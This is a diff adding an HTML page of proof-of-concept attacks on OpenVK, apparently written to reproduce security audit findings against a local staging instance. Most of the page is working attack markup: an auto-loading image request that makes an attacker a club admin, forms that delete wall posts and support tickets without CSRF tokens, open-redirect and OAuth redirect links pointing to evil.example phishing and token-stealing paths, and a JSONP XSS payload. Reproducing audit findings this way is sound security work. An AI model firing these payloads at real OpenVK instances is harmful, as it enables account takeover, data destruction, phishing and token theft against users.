@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>OpenVK CSRF STR demos (staging only)</title>
+  <style>
+    body { font-family: system-ui, sans-serif; max-width: 52rem; margin: 2rem auto; padding: 0 1rem; }
+    code, pre { background: #f4f4f4; padding: 0.2em 0.4em; }
+    .warn { color: #a40; border: 1px solid #a40; padding: 0.75rem; }
+    section { margin: 1.5rem 0; padding: 1rem; border: 1px solid #ddd; }
+    button { margin: 0.25rem 0; padding: 0.4rem 0.8rem; cursor: pointer; }
+  </style>
+</head>
+<body>
+  <h1>OpenVK CSRF / GET-write STR</h1>
+  <p class="warn">
+    For <strong>your staging</strong> only. Open this file while logged in as the victim
+    (club owner / user with coins). Placeholders are filled by <code>str_all.sh</code>
+    into <code>evil_csrf.generated.html</code>.
+  </p>
+  <p>Base: <code>http://127.0.0.1:8088</code> · Club: <code>CLUB_ID</code> · Attacker user: <code>ATTACKER_USER_ID</code></p>
+
+  <section id="club">
+    <h2>P0-8 Club setAdmin via GET (no CSRF)</h2>
+    <p>As club owner, clicking/loading this promotes <code>ATTACKER_USER_ID</code>:</p>
+    <p>
+      <a href="http://127.0.0.1:8088/clubCLUB_ID/setAdmin?user=ATTACKER_USER_ID" target="_blank" rel="noreferrer">
+        Open setAdmin link
+      </a>
+    </p>
+    <p>Image CSRF (auto):</p>
+    <img src="http://127.0.0.1:8088/clubCLUB_ID/setAdmin?user=ATTACKER_USER_ID" alt="csrf" width="1" height="1"
+         onerror="document.getElementById('club-status').textContent='request fired (check club managers)';" />
+    <p id="club-status"></p>
+  </section>
+
+  <section id="rpc">
+    <h2>P0-7 /rpc token mint (manual)</h2>
+    <p>
+      Browser JS cannot easily craft MessagePack. Use DevTools on
+      <code>http://127.0.0.1:8088/authorize</code> → Allow → copy <code>POST /rpc</code> and replay
+      from another origin without CSRF hash, or use a msgpack client with session cookie.
+    </p>
+  </section>
+
+  <section id="wall">
+    <h2>P1-12 Illustrative state-changing forms (adjust paths)</h2>
+    <p>These forms omit CSRF <code>hash</code>. Update action URLs to match your instance routes before demo.</p>
+
+    <h3>Wall delete (example — set post ids)</h3>
+    <form method="POST" action="http://127.0.0.1:8088/wall0_POSTID/delete">
+      <input type="hidden" name="junk" value="1" />
+      <button type="submit">Try wall delete (edit POSTID in HTML)</button>
+    </form>
+
+    <h3>Support ticket delete (example)</h3>
+    <form method="GET" action="http://127.0.0.1:8088/support/delete/TICKET_ID">
+      <button type="submit">Try support delete (edit TICKET_ID)</button>
+    </form>
+  </section>
+
+  <section>
+    <h2>P0-2 / P0-3 quick links</h2>
+    <ul>
+      <li><a href="http://127.0.0.1:8088/away.php?to=https://example.com/">Away open redirect</a></li>
+      <li><a href="http://127.0.0.1:8088/login?jReturnTo=https://evil.example/phish">Login jReturnTo</a></li>
+      <li><a href="http://127.0.0.1:8088/authorize?client_name=str&amp;redirect_uri=https://evil.example/steal&amp;response_type=token">OAuth evil redirect_uri</a></li>
+      <li><a href="http://127.0.0.1:8088/method/utils.getServerTime?callback=alert(1)//">JSONP XSS</a></li>
+      <li><a href="http://127.0.0.1:8088/admin/sandbox">Admin sandbox dump</a></li>
+    </ul>
+  </section>
+</body>
+</html>
